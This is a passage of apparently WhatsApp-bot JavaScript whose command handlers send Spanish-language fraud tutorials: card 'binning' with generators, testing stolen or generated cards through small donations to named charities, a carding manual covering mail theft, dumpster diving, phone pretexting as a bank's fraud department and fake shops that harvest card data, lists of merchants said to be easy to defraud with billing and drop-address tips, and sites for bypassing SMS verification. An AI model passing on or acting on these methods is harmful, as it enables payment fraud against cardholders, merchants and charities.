- Si deseas un bin privado la unica manera que existe es buscando foros, grupos donde pasen ccs (no importa que esten quemadas), sacarles extras y ponerse a calar!

Ejemplo ✍

➜ CC: 5240821096213085|02|2029|824
➜ BIN: 524082109621xxxx

❑ ¿En qué páginas jalan?

- Bueno, esto depende de donde mucho del bin. Hay bins que jalan en una sola pagina ejemplo (crunchyroll) y hay otros que son multifuncionales ejemplo (crunchyroll, mubi, Onlyfans, entre otras).

❒ ¿Cómo generar ccs?

- Ingresaras a https://namso-gen.com/ copiaras tu bin y le darás al botón de generar.

-  Recuerda que estas tarjetas solo son generadas!

❑ ¿Que extrapolar?

- Existen muchos métodos, pero en esta introducción, no la veremos. Si deseas saber mucho más a detalle que extrapolar, usa al bot o apk del grupo, ahi encontrarás una información mucho detallada https://www.mediafire.com/file/oxlgjgmlgw2uh6c/Bineria+Universal.apk/file

❑ ¿Qué es un vpn?

- Pues basicamente un vpn es una herramienta que usaremos casi siempre xd
- Con la vpn nosotros podremos crear cuentas premiun

Ejemplo ✍

Queremos obtener una cuenta de tidal premiun, pero el bin es de Colombia y yo soy de Venezuela. Lo que haremos será usar un vpn que nos permita cambiarnos de pais (dirección ip)

❑ ¿Qué es live?

Básicamente las lives son tarjetas de crédito aprobadas por el mercado, es decir, tienen fondos. Estás sirven para realizar pequeñas, grandes compras fisicas y/o renovar suscripciones, información más detalladas del tema de lives en el bot.

⚠ Páguinas para sacar lives manualmente

https://karmeyhesed.org/
https://dzi.org/make-a-donation 
https://www.habitat.org/ 
https://secure.givewell.org/

❑ ¿Cómo sacar lives manualmente?

- Se registran en cualquiera de esas paguinas como una paguina cualquiera, luego donas o haces una compra menor (cargo o monto pequeño). Si les da decline significa que esta muerta y si les sale Thanks you o code incorrect significa que esta viva.

- Como dato adicional les invito a unirse a mi canal de telegram subo bins y métodos interesantes https://t.me/bineriauniversal

❑ ¿Qué es chavelo?

-Se le denomina “Chabelo” a un bin que pese a que es viejo sigue funcionando en varias páginas.

❑ ¿Corremos riesgo al utilizar un bin?

- Los bins no son tan peligrosos, con la acción de binear, solo se estafa a la empresa en donde la usaste la cc generada.

- Las tarjetas no son de dueños reales, solo son algoritmos, que de alguna manera pasan en una página.

- Lo más malo que te puede pasar, es que una página bloquee tu IP real permanentemente o tu dispositivo.

- La otra cosa, es que tu IP puede estar en una lista negra de SPAM, eso es provocado usualmente por vpns como holavpn que vende este tipo de datos de sus usuarios a otras compañías, lo cual es algo que Hola no te especifica. Igual, hay muchos mejores vpns .

- Es muy raro que pase, binear no es peligroso, si es que no abusas o llegas a un extremo muy pero muy elevado.

❑ ¿Qué es ban?

- Seguramente en los diversos grupos has escuchado esto, literalmente Ban significa prohibir esto es que se te pone una restricción; ya sea total, parcial, temporal o permanente, al sitio en donde has realizado la compra.

- Bueno bros espero les haya servido esta breve introducción, recuerda que si tienes dudas puedes contactarme, o preguntarle a cualquier miembro del grupo con gusto ellos te ayudarán.`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: introduccionbins })									 
          break
          
          case 'introduccioncarding':
case 'introduccion_carding':
case 'introduccion-carding':
case 'introduccióncarding':
case 'introducción_carding':
case 'introducción-carding':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/introduccioncarding.jpg`)
 introduccioncarding = `Bueno aprovechando que el amigo SP3L1N4X  dejo una pequeña introduccion al Carding

Manual de Carding

1.- Introducción
2.- Carding
3.- Estructura de las Tarjetas de Crédito
4.- Tengo el numero que hago?
5.- Quiero tener más Números de tarjetas rápidamente
6.- Trashing
7.- El Verdadero Peligro
8.- Herramientas



Disclamer: NO asumo ninguna responsabilidad debida al mal empleo de la información aquí contenida, puesto que este texto solamente tiene fines educativos y en ningún caso pretende incitar a nadie a cometer ningún delito ya sea informático o de otra índole.



Buenas con todos los que puedan leer este documento.


1.- Introducción

En este manual voy a indicar que es el carding? Algunos términos del mismo como utilizarlo y sacar provecho Smiley

Comencemos...................

2.- Carding

Este es un concepto que indica lo más claramente posible que es y de que se trata el carding

Carding: Es el uso ilegitimo de las tarjetas de crédito, o de sus números, pertenecientes a otras personas. Se relaciona con el hacking, porque para conseguir números de tarjetas de créditos, una de las formas es utilizando Ingenieria Social y sobre todo nuestra inteligencia (esto es lo mas importante)

Se debe tener mucho cuidado en hacer esto ya que nos podemos meter en muchos líos.
Con nuestras tarjetas de crédito debemos ser cuidadosos ya que alguien puede leer este documento antes que uno de ustedes y ser capaz de estafarlos.

Se puede recuperar el dinero talvez pero para eso tendrían que hablar con el administrador del sitio donde se realizo el pago del artículo solicitando la IP de donde se hizo la compra y luego de todo esto tenemos que demostrar que nosotros no hicimos la compra del mismo.

El carding consiste en comprar usando la cuenta bancaria o la tarjeta crédito de otro, esto se consigue con un poco de ingenieria social y mucha perseverancia.

Cuando alguna persona utiliza carding para comprar objetos materiales se suele utilizar una dirección falsa con una identificación también falsa, es decir todo el formulario de compra lo llena con datos falsos.
De esta manera el comprador quedara esperando en el lugar indicado la entrega del material como si se tratara de su residencia.

La filosofía de los carders se basa en que existe mucha gente que tiene grandes cantidades de dinero que no cae nada mal utilizar algo de ese dinero para comprar algunas cositas para cada uno de ellos, ya que posiblemente el dueño de la tarjeta ni se de cuenta de esta compra que el no la hizo.

Si ustedes están pensando en comprar por Internet programas o suscripciones y piensan que utilizando el carding será muy fácil pues tienen toda la razón resulta muy sencillo.
En este manual se conseguirá revisar los métodos que utilizan los carders para hacerse de los números de tarjetas y burlar las seguridades para poder comprar sin ningún tipo de problemas.

Tienen que saber que el robo de una tarjeta de crédito es un delito universal por lo que puede tener causas penales muy graves si no quieres irte de paseo a Cana..da (para otros países Cárcel) no intenten hacer nada de esto.


3.- Estructura de las Tarjetas de Crédito

Para mi esta es la parte más importante ya que aquí sabremos como funcionan las tarjetas de crédito porque se puede hacer programas para que nos den números validos pero lo importante es saber como es que se hace todo eso

Comencemos.....

Los números de las tarjetas se forman de 16 dígitos divididos en 4 grupos de 4 dígitos pueden tener valores del 0 al 9 los primeros 4 dígitos sirven para determinar el banco.

El resto de números se pone al azar no mentira vamos a ver el algoritmo

Hagamos un ejemplo de la creación de un número de tarjeta

Numero de tarjeta: 5180 2345 3942 8765

Las posiciones impares son:

5
8
2
4
3
4
8
6

Luego de esto se multiplica los 2 primeros dígitos entre si luego los siguientes y asi sucesivamente para que sea mas claro quedaría de la siguiente forma:

5*8=40
2*4=8
3*4=12
8*6=48

Si tenemos cifras mayores a 9 se suma los números es decir las cifras reducidas 8+5=13 entonces
1+3=4

En el ejemplo quedaría asi:

5*8=40 4+0=4
2*4=8 8
3*4=12 1+2=3
8*6=48 4+8=12 1+2=3

En resumen los números que nos quedan son:

4
8
3
3


Luego de esto suma los números pares que descartamos al principio y súmalos con estos el resultado debe ser un número múltiplo de 10 para que el número sea correcto:

4+8+3+3+1+0+3+5+9+2+7+5=50


Si no nos diera un numero correcto como va a suceder en la mayoría de los casos lo recomendable es dejar el ultimo casillero libre y jugar con este digito hasta que nos de un numero valido.

Esta es una de las formas de conseguir un numero de tarjeta de crédito es decir adivinando a ver si nos sale otra puede ser esperar pacientemente el fin de mes el momento que llega el corte de pago de la tarjeta del vecino nos robamos su correspondencia y listo ahí tenemos un numerito.

O buscamos dentro de su basura (esto creo que es mas feo) pero igual funciona ya que no suelen romper los cortes de tarjeta de crédito simplemente los botan arrugados a la basura pero igual obtenemos el numero deseado.

Otra de las formas es creando un portal de Internet donde ponemos artículos a la venta se explicara esto mas adelante

4.- Tengo el numero que hago?

El momento de realizar una compra en línea nos solicitan una serie de datos pero los mas importantes es decir los que nunca faltan son estos:

Nombre.
Numero de Cuenta.
Fecha de Expiración.
Tipo de tarjeta.
Numero de verificación

Estos datos son muy fáciles de conseguir (a veces)

El nombre es el de la victima sencillo de conseguir, el número de su tarjeta es un poco más complicado pero hay formas revisando su correspondencia por ejemplo

La fecha de expiración la podremos conseguir haciéndonos pasar por el banco con los datos que ya conocemos podremos decirle que vamos ampliar su cupo por sus pagos puntuales o cualquier cosa esto ya queda a su imaginación lo que si nos queda claro es que conseguir estos datos resulta sumamente sencillo.

Tipo de Tarjeta ya lo sabemos ya revisamos su correspondencia revisar paso uno Wink
Para reconocer el tipo de tarjeta se puede utilizar, el primer digito de la tarjeta que nos indica el tipo de la misma.

Si el primer numero es....

3 ->American Express (15 dígitos)
4 ->VISA (13 o 16 dígitos)
5 ->Mastercard (16 dígitos)
6 ->Discover (16 dígitos)

Con estos datos ya se puede comprar algo en línea generalmente los carders realizan una compra de algún software pequeño que sea de descarga o una subscripción para ver pornografía esto lo hacen para probar si la tarjeta funciona o no .

Si el momento de la compra nos solicitaran mas datos ya saben que hacer es mas creo que al momento de revisar su correo no tendrán estos datos tendrán muchos mas.


5.- Quiero tener más Números de tarjetas rápidamente

Como aquí se a explicado bastante me canse y ahora hagan un repaso de lo que aprendieron hasta aquí y piensen en una posible victima hasta mientras me voy hacer un juguito y regreso para seguirles explicando unas cositas bastante interesantes.


Bueno después de estos 15 minutos de tranquilidad volvamos en lo que estábamos..


Para obtener tarjetas podría entrar en juego la famosa Ingenieria Social que tal si llamamos a nuestra victima y decimos algo como lo siguiente:

“Buenas tardes, soy Camilo Albornoz de la sección fraudes de Master Card , hemos detectado un posible uso fraudulento de su tarjeta, por lo que necesitamos que nos indique todos los datos de la misma, para realizar una comprobación”

Este tipo de llamada es bueno realizarla en horas de trabajo ya que la persona se encuentra preocupada con la cabeza enfocada solo en su trabajo por lo que puede resultar un buen momento para que nuestra victima caiga en esta trampa.

Si nos llamaran de un banco diciéndonos algo parecido a lo que escribí anteriormente lo que tienen que hacer es pedir que les repita su nombre completo solicitarle el numero y devolver la llamada de esta manera se evitaran este tipo de estafa.

Todos los que lean pilas que ya están avisados de cómo funciona este método

Aunque parezca mentira existe gran cantidad de gente que cae en este juego y dan todos los datos que les solicitan sin ningún tipo de inconveniente.

Para verificar si la tarjeta es útil se puede hacer una llamada a la entidad bancaria de donde pertenece la tarjeta nos hacemos pasar como dueños de la tarjeta indicando que quisimos hacer una compra y nuestra tarjeta fue rechazada para verificar si hablan con el dueño de la tarjeta pedirán verificar unos datos harán preguntas sencillas como cual es el numero de tarjeta, numero de verificación esto ya no es problema para nosotros ya que tenemos toda la información que conseguimos antes al hacernos pasar como empleados de la entidad que emite la tarjeta

La información que conseguimos aquí es fundamental ya que podremos saber si la tarjeta es principal o es un adicional si es de uso nacional o mundial cuanto es el cupo que tiene la misma , etc.

Las compras que suelen hacer los carders son mediante Internet o telefónicamente no de montos muy altos para que no se pida confirmación al dueño de la tarjeta y para no levantar sospechas

El carder es muy cuidadoso no puede andar gritando al mundo sus hazañas porque el es un ladrón el esta robando , si hace un pedido de un articulo no puede pedir otro y otro articulo a la misma dirección tiene que ir rotando de lugares .

Generalmente si el encargo esta en la oficina de correos el ira cuando no haya nadie si estuviera mucha gente preferirá no arriesgarse y ni siquiera acercarse mas al lugar ya que podría resultar peligroso para el

Un carder nunca pide algo gigante no se comprara un carro para que le traigan por DHL ni nada extremadamente caro (un collar de oro de 18 kilates) tampoco algo muy baratito pero estaría bien que se compre una palm ultimo modelo ese es un buen carder.

El problema que se podría presentar es que el carder cada vez quiere comprar algo mas y no para se vuelve mas adicto por el riesgo y por que se esta comprando buenas cositas pero no se da cuenta que talvez lo tiene fichado y próximamente le haga una visita la policía

Los lugares de entrega de tus pedidos:

NOTA.- NUNCA HAGAS QUE TE ENTREGUEN EN TU CASA

Pero si lo puedes hacer al azar escogiendo alguna persona de la guía telefónica claro que no este tan lejos de tu casa eso si necesitas hablar muy bien para explicar a alguien porque le llego algo tuyo en su casa debes ser bueno para tratar con la gente y no ponerte nervioso.
La casa de un amigo próximo a cambiarse de casa que te ayude con este favor antes de irse difícil esta forma pero puede ocurrir.

Pedir que lo envíen a una dirección de un condominio generalmente lo dejan al guardia ya que asumen que el conoce a toda la gente del condominio y por seguridad a la persona que deja la correspondencia no la dejaran pasar porque son “Ordenes de la Administradora” y quien será la única persona que ira a pedir el paquete?? Exacto el carder.


Bueno estas son una de las tantas formas en las que pueden recibir sus compras seguramente a ustedes se les ocurrirá muchas mas .



6.- Trashing

Me parece un tema interesante y que no se lo ve regularmente aquí les explico de que se trata aunque entre las ideas que indique antes ya lo mencione.

Se trata de buscar y remover la basura de la victima que estas buscando es decir intentar encontrar estados de cuenta, cortes de pago, recibos, etc.

Por eso un sano consejo cuando boten algo importante rompanlo y botenlo si es posible haciendolo tiritas talvez piensen este tipo esta medio loco pero yo supe de alguien que quemaba sus papeles una vez por semana quien es el loco el o yo??

7.- El verdadero Peligro


Ahora con toda la tecnología a nuestro alcance se pueden hacer muchas cosas , esto es lo que utilizan los carders necesitan saber programar y dos invitados muy importantes.

PHP + MySQL

PHP.- Lenguaje de programación web
MySQL.- Base de Datos trabaja excelente con PHP

Que es lo que hacen??

Se esmeran un par de horas programando un sitio de venta de artículos pueden ser de cualquier tipo deportivos, tecnológicos, etc.

Con precios sumamente accesibles y con productos de excelente calidad la victima se emociona con esta verdadera gamga cuando va a adquirir un producto viene el método de pago el cual es con tarjeta de crédito.

La victima ingresa su tarjeta , nombres , numero de verificación todos los datos necesarios luego de esto el carder ya posee todo lo que necesita queda simplemente enviar un e-mail o hacer una llamada disculpándose y notificando que la transacción no se realizo por no tener el articulo en stock o simplemente el momento que supuestamente hace la compra se le muestra un mensaje de error que diga algo similar a esto:
“NO SE PUDO CONCLUIR LA TRANSACCION”
La victima pensara que no paso nada pero nuestra base de datos ya se engordo un poco mas y con datos totalmente reales y listos para usar.


8.- Herramientas

Existen programas que nos ayudan a generar números de tarjetas validos esto ahora tiempo a los carders


Estas herramientas son:

Fakeid

Te da otros datos de personas verificables, interesante para quienes no tienen habilidad de inventarse personalidades.

Para aquellos programas que no te brindan la fecha de expiración solo queda hacerlo manualmente, probando al mejor estilo brute forcing.

CCards

En caso de que quieran ver unos números de tarjeta de crédito validos como ejemplo, vean el programa CCards.exe que les genera de una manera sencilla y rápida estos números


Credit Card Master 4

Este completo programa permite realizar una amplia cantidad de acciones destinadas al carding, genera numeros te ayuda viendo si el digito verificador es correcto y si no es asi no te preocupes ahi mismo te genera otro lo importante es que todos los datos estén correctos


Credit

Es un programa muy potente parecido al Credit Card Master aunque tiene interfaz grafica y tiene algunas otras utilidades como por ejemplo generar identidades falsas que como estuvimos viendo pueden ser de gran utilidad.


Bueno espero que toda la explicación del manual este clara y que les sirva para conocer el carding más a fondo.
Nunca olviden que esto es totalmente ilegal y que si no quieren meterse en líos no lo pongan en práctica suerte a todos.

Espero que les haya gustado, y espero que con esto mas o menos se de una ideita...


Saludos a todos Bic`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: introduccioncarding })									 
          break
          
          case 'sitioscardeables':
	  case 'sitios_cardeables':
	  case 'sitios-cardeables':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`Sitios cardeables 2021

games STEAM :
www.gamecards.com
www.instant-gaming.com
www.kinguin.net -> Skrill
www.getgamesgo.com
www.bundlestars.com -> It's a very very good site
www.dlgamer.us
www.yuplay.com
www.elitekeys.com
www.gog.com
www.offgamers.com
www.gamersgate.com
www.go2arena.com
Method : You must have a good card and work GOOD LUCK



Website: www.scufgaming.com
Items: Xbox Controllers
Method: Bill=Ship
Shipping: Worldwide

Website: www.hollisterco.com
Items: Clothing
Method: Bill=Ship
Shipping: Worldwide

Website: www.littlecaesars.com
Items: Food Giftcard
Method: Bill=Ship
Shipping: USA

Website: www.tomtop.com
Items: Electronic
Method: Bill=Ship
Shipping: Worldwide


Website: www.steaknshake.com
Items: Food Giftcard
Method: Bill=Ship
Shipping: USA



website: www.abercrombie.com
Items: Clothing
Method: Bill=Ship
Shipping: Worldwide

Website: www.footlocker.com
Items: Clothing/Shoes
Method: Bill=Real, Ship=Your Drop

Shipping: Worldwide

Items: Clothing
Method: Bill=Ship
Shipping: Worldwide
Website: www.SOLRepublic.com

Items: HeadPhones
Method: Bill=Ship
Shipping: USA\Canada ONLY

https://skreened.com/
EASY/ CLOTHES

this is very cheap n easy to card
https://cheap-forex-vps.com/

GAME KEYS

mmoga.net
g2play.net
simplycdkeys.com
allcdkey.com
kinguin.net
humblebundle.com
gog.com
activision.com
eurotrucksimulator2.com
gamersgate.com
cdkeyhouse.com
gamekeystore.net
elitekeys.com
steampowered.com
cdkeys.com.au (easiest)


https://www.lasenza.com/ (.co.uk ships to UK, and does have vbv or msc)
Same bill+ship (Your drop address)
Does NOT have vbv or msc
Shipping to USA, and UK if using the co.uk domain
(for ladies, this is basically same quality as victoria secret)

https://www.agentprovocateur.com/ (This is basically the LV of women lingerie in the UK, you can card gift vouchers and sell for profit on eBay or local marketplace. - Use EU non-vbv/msc for best results)
Same bill+ship (Your drop address)
Does HAVE vbv and msc
Shipping Worldwide

https://www.ryanair.com/en (flight booking)
Cardholder billing + traveler name/details
Does NOT have vbv or msc
Use EU CCV for best result

www.yancor.com (Mens fashion/designer clothes.)
Pay through PayPal without VBV/MSC. Or through Skrill with VBV/MSC bypass with AMEX.
Use billing same as Card holder, sock5/vpn match country of card.
Recommended use Poland card`, MessageType.text, {quoted: mek})
//  break	
									

	case 'sitioscardeables':
	  case 'sitios_cardeables':
	  case 'sitios-cardeables':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`🎁 PAGINAS CARDEABLES 🎁

MUSICA
https://www.granatamusic.com/
https://www.octavemusicstore.com/
 
RELOJES
https://greatgeorgewatches.com/
https://www.mvmtwatches.com/
https://www.thehorse.com.au/
 
ROPA
https://www.redbullshopus.com/
https://www.houseofholland.co.uk/ ENVÍO 100%
https://janemotorcycles.com/
https://www.3sixteen.com/
https://www.theghostlystore.com/
https://shop.bremont.com/
https://www.commondeervt.com/
https://www.mollyjogger.com/
https://global.ksubi.com/
https://teespring.com/
https://teechip.com/
https://iedm.com/
https://asphuck.com/
 
CUADROS:
https://asphuck.com/
https://mammoth.co/
https://shop.factory43.com/
https://shop.ugmonk.com/
 
COMIDA:
https://www.vwordmarket.com/
https://kutoa.com/
https://www.pipsnacks.com/
 
TENIS
https://www.hickies.com/
http://www.buscemi.com/
https://www.flatspot.com/
https://packershoes.com/
 
TELEFONOS
https://www.needabump.com/
https://www.zgla.com/
https://thedairy.com/
 
LENTES
https://enkieyewear.com/
https://www.toyshades.com/
 
CARDABLE CON CC Y PP ALEMANAS
https://safishing.com/
https://packershoes.com/
https://www.ledlowsgeneralstore.com/
 
ALEATORIO :
https://store.penny-arcade.com/
https://www.madsencycles.com/
https://www.goodasgold.co.nz/
http://www.lapolicegear.com/ 4500 Envia a USA
https://www.handcuffwarehouse.com 4500 Envia a USA
https://www.musclepharm.com/ 4500 Envia a USA
https://www.sarraf.com/ Oro 4500 Envia a USA
http://www.beallsflorida.com 4500 Envia a USA
https://www.gilt.com/ 4500 5178 Envia a USA
http://www.attunefoods.com/
http://shop.glutino.com/
https://shop.soyvay.com/
https://shop.torani.com/
http://shop.justins.com/
http://shop.fitcrunchbars.com/
https://shop.gaiaherbs.com/
http://shop.mariani.com/
https://shop.skinnypop.com/
http://shop.wholesomesweet.com/
http://shop.naturesgate.com/
https://shop.pureorganic.com/
http://shop.gimmehealth.com/
https://shop.choiceorganicteas.com/
https://shop.emergenc.com/
http://shop.orgain.com/
http://shop.crispygreen.com/
https://shop.oberto.com/ (Aceite de oliva)
http://shop.eightoclock.com/ (cafe en grano y molido)
434258
http://thechileshop.com/
http://www.michaels.com/
https://www.forever21.com/us/shop
http://www.acapellastore.com/
https://www.kichink.com/
https://www.newegg.com/
https://www.dropdead.co/
asos.com Ropa
champssports.com Ropa
fruugo.es Ropa
keller-sports.es Ropa
net-a-porter.com Ropa, Oro
planet-sports.com/es/ Ropa
sarenza.es Ropa
skatedeluxe.com Ropa
eset.com Antivirus
xidax.com / jugador de pc
southbeachsmoke.com / Vapor
amazon.com
www.overstock.com/
http://www.jcp.com
http://www.victoriasecret.com
http://www.zappos.com
http://smallworld-us.com
http://namebargain.com/
http://strawberrynet.com
http://www.customizedgirl.com
http://dancewearsolutions.com
http://www.hottopic.com/hottopic/Apparel.jsp
https://www.thewhitecompany.com/
http://pumatops.com/
http://www.tapout.com/
http://global.rakuten.com/en/store/atn/
http://www.sierratradingpost.com
http://www.fanatics.com
http://www.goducks.com
http://www.puritan.com
http://www.cyberguys.com`, MessageType.text, {quoted: mek})
 // break
					
	case 'sitioscardeables':
	  case 'sitios_cardeables':
	  case 'sitios-cardeables':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`⚖️ PAGINAS CARDEABLES ⚖️

Aqui dejo unas paginas en cual yo he recibido las compras sin problemas:

activinstinct.com Ropa

Adidas España Ropa

asos.com Ropa

champssports.com Ropa

fruugo.es Ropa

keller-sports.es Ropa

net-a-porter.com Ropa, Oro

planet-sports.com/es/ Ropa

sarenza.es Ropa

skatedeluxe.com Ropa

eset.com Antivirus

xidax.com /pc gamer

southbeachsmoke.com /Vapor

amazon.com

www.overstock.com/
http://www.jcp.com
http://www.victoriasecret.com
http://www.zappos.com
http://smallworld-us.com
http://namebargain.com/
http://strawberrynet.com
http://www.customizedgirl.com
http://dancewearsolutions.com
http://www.hottopic.com/hottopic/Apparel.jsp
https://www.thewhitecompany.com/
http://pumatops.com/
http://www.tapout.com/
http://global.rakuten.com/en/store/atn/
http://www.sierratradingpost.com
http://www.fanatics.com
http://www.goducks.com
http://www.puritan.com
http://www.cyberguys.com

https://www.fivefourclub.com/
munchpak.com
njoy.com
strawberrynet.com
facturacion=envio
---------------------------------------------------
Rakuten.com
en facturacion usar la de la tarjeta.
www.partycity.com/
Bill=Ship
-----------------------------------------------------------
https://www.getorchard.com/us/
-----------------------------------------------------------
http://www.ipmart.com/main/
usar la direccion de envio como la de facturacion
-----------------------------------------------------------
http://www.accessoryjack.com/
usar la direccion de envio como la de facturacion
----------------------------------------------------------- 
http://www.razerzone.com/
-----------------------------------------------------------
http://www.drjays.com/
usar la direccion de envio como la de facturacion
-----------------------------------------------------------
OTRAS:
http://www.perryolsen.com/
http://www.stickyj.com/
http://www.pugster.com/
http://www.mmoga.com/
http://www.jewelry.com/
http://www.jewelbasket.com/
www.refurb4less.com`, MessageType.text, {quoted: mek})
  break
  
  case 'plataformasparacalar':
	  case 'plataformas_para_calar':
	  case 'plataformas-para-calar':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`100  PLATAFORMAS DONDE PUEDEN CALAR , VAMOS ✅

1 CRUNCHYROLL
2 PLEX 
3 TOPIC
4 HIDIVE
5 BRITBOX 
6 UMC TV
7 TIDAL
8 NAPSTER
9 HBO MAX 
10 HBO GO MÉXICO 
11 HBO ESPAÑA 
12 FÚBO TV
13 FANATIZ 
14 DIRECT TV GO MÉXICO
15 BLIM 
16 PUREFLIX
17 SCRIBD
18 CANVA 
19  HOOTSUITE
20 LINKEDIN
21 SHUDDER
22 VRV 
23 SKYPE 
24 PROXYSCAPE
25 INDIEFLIX
26 WWE 
27 FILMBOX
28 MUBI TV
29 MICROSOFT 365
30 AWS AMAZON 
31 AZURE 
32 SPOTIFY 
33 YOUTUBE 
34 BADOO 
35 PLAYSTORE 
36 FACEBOOK ADS
37 NAMCHEAP VPN 
38 VPN CITY 
39 PRIVATE TUNEL 
40 PAYPAL
41 APPLE MUSIC 
42 EBAY 
43 ALIEXPRES
44 DEEZER 
45 FANATIZ 
46 DAZN 
47 HULU 
48 NOOR PLAY 
49 SOUNDCLOUD
50 DUOLINGO 
51 PANDORA 
52 SMALL PDF 
53 BLIZZARD
54 WAR GAMING
55 LUMOSITY LIFETIME 
56 UTOMIK
57 DC UNIVERSE
58 ETSY
59 MARVEL UNLIMITED
60 PICSART 
61 CALM
62 ANCESTRY 
63 HISTORY VAULT 
64 IP VANISH 
65 DROPBOX
66 ONLYFANS 😍
67 ADOBE
68 PREZI 
69 WEBSHARE 
70 ACORN TV
71 PRIVATE  TÚNEL
72 NOGGIN
73 INFLTR
74 APP STORE 
75 QOBUZ 
76 TREEHOUSE
77 GREEN MAN GAMING
78 STEAM 
79 G2A 
80 NORTON 
81 IWOOT 
82 PUMA 
83 ADIDAS
84 REEBOK
85 NIKE 
86 HM
87 MY PREOTEIN
88 UBER EAT 
89 MC DONAL,S 
90 MERCADO LIBRE
91 SHERLY 
92 STAN 
93 OLDFLIX
94 VIKI RAKUTEN
95 PDF DRIVE 
96 ATRESPLAYER
97 SHUTHESTOCK
98 INSTAGRAM
99 PORHUB
100 BRAZZERS`, MessageType.text, {quoted: mek})
  break
  
  case 'vpn':
	  				case 'vpns':
					case 'vpnpremiun':
					case 'vpnspremiun':
					case 'vpn_premiun':
					case 'vpn-premiun':
					case 'vpns_premiun':
					case 'vpns-premiun':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
						  
wiw = fs.readFileSync(`./media/vpn.jpeg`)
 vpn = `⚜ VPN PREMIUN ⚜

🌐 TurboVPN

https://www.mediafire.com/file/qguhyliuqql4v93/Turbo_VPN.apk/file

🌐 Ultra VPN

https://www.mediafire.com/file/xwl06cfqnkyh7p1/Ultra_VPN.apk/file

🌐 Hola VPN

https://www.mediafire.com/file/si7o10xofgayewk/Hola_VPN.apk/file

🌐 VPNhub

https://www.mediafire.com/file/j3lullhkk59y1vi/VPNhub.apk/file

🌐 AdGuard VPN

https://www.mediafire.com/file/sh0dfwlxc87tfds/AdGuardVPN.apk/file

🌐 TunnelBear

https://www.mediafire.com/file/ep0fv0l2yna9xzk/TunnelBear.apk/file

🔱 Cortesia De: @BineriaUniversal`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: vpn})									 
          break
          
          case 'navegadores':
	  				case 'navegadoresprivados':
					case 'navegadores_privados':
								if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/navegadores.jpeg`)
 navegadores = `⚜ Navegadores Privados ⚜

🔰 DuckDuckGo

https://play.google.com/store/apps/details?id=com.duckduckgo.mobile.android&hl=es_US&gl=PE

🔰 FireFox Focus

https://play.google.com/store/apps/details?id=org.mozilla.focus

🔰 Navegador Web Dolphin Browser

https://play.google.com/store/apps/details?id=mobi.mgeek.TunnyBrowser

🔰 Brave Browser

https://play.google.com/store/apps/details?id=com.brave.browser&hl=es_US&gl=PE

🔰 Cortesia De: @BineriaUniversal`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: navegadores })									 
          break
          
          case 'sitiossms':
	  				case 'sitiosms':
					case 'sitios_sms':
					case 'sitios-sms':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/sms.jpeg`)
 sitiossms = `🔰 SITIOS HQ PARA VERIFICACIÓN DE SMS DE BYPASS (ALGUNAS YA NO FUNCIONAN) 🔰

 Ⓜ️ʀᴇᴄᴇɪᴠᴇ ᴀɴ sᴍs: https://receive-a-sms.com/
 Ⓜ️sᴍs ʀᴇᴄᴇɪᴠᴇ ғʀᴇᴇ: https://smsreceivefree.com/
 Ⓜ️ᴏɴʟɪɴᴇ sᴍs: https://sms-online.co/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ: https://smsreceiveonline.com/
 Ⓜ️ɢᴇᴛ ᴀ ғʀᴇᴇ sᴍs ɴᴜᴍʙᴇʀ: https://getfreesmsnumber.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs: http://sms-receive.net/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ɴᴇᴛ: https://www.receivesmsonline.net/
 Ⓜ️ғʀᴇᴇ sᴍs ᴄʜᴇᴄᴋs: http://www.freesmsverifications.com/
 Ⓜ️7 sɪᴍ.ɴᴇᴛ: http://7sim.net
 Ⓜ️ʜs3x: http://hs3x.com
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ ғʀᴇᴇ sᴍs: http://receivefreesms.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ ғʀᴇᴇ sᴍs.ɴᴇᴛ: http://receivefreesms.net/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ɪɴ: http://receivesmsonline.in/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ: https://receive-sms-online.com/
 Ⓜ️sᴇᴇ sᴍs: https://www.smsver.com/
 Ⓜ️ɢʀᴏᴏᴠʟ: https://www.groovl.com/
 Ⓜ️sᴍs.sᴇʟʟᴀɪᴛᴇ: http://sms.sellaite.com/
 Ⓜ️sᴇɴᴅ sᴍs ɴᴏᴡ: http://www.sendsmsnow.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ᴇᴜ: http://receivesmsonline.eu/
 Ⓜ️ᴘʀᴏᴏᴠʟ: https://www.proovl.com/numbers
 Ⓜ️ᴀɴᴏɴ sᴍs: https://anon-sms.com/
 Ⓜ️ʜɪᴅᴇ ᴍʏ ɴᴜᴍʙᴇʀs: http://hidemynumbers.com/
 Ⓜ️ᴘɪɴɢᴇʀ: https://www.pinger.com/
 Ⓜ️ғʀᴇᴇ ᴏɴʟɪɴᴇ ᴘʜᴏɴᴇ: https://www.freeonlinephone.org/
 Ⓜ️5sɪᴍ: https://5sim.net/
